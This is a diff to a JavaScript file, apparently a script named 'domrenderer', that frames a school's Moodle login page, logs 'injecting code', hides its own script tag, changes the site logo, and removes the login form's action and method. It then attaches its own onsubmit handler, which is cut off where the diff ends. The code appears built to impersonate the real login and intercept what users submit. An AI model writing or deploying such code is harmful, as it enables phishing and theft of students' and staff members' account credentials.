@@ -25,20 +25,14 @@ if(documentTree == undefined && document.location.hash != "#noiframe"){
 				doc.location.href += "#noiframe";
 			}
 			
+			doc.getElementsByClassName("logo mr-1")[0].src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s"
+
+			
 			if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php"){
 				console.log("injecting code");
 				doc.body.innerHTML = doc.body.innerHTML.replace('<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>','')
-				
-				doc.getElementsByClassName("logo mr-1")[0].onload = function(){
-					
-					this.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s"
-				}
-				
-				document.getElementsByClassName("logo mr-1")[0].onload = function(){
-					
-					this.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s"
-				}
-				
+								
+
 				doc.getElementById("login").removeAttribute("action");
 				doc.getElementById("login").removeAttribute("method");
 				doc.getElementById("login").onsubmit = function(event){
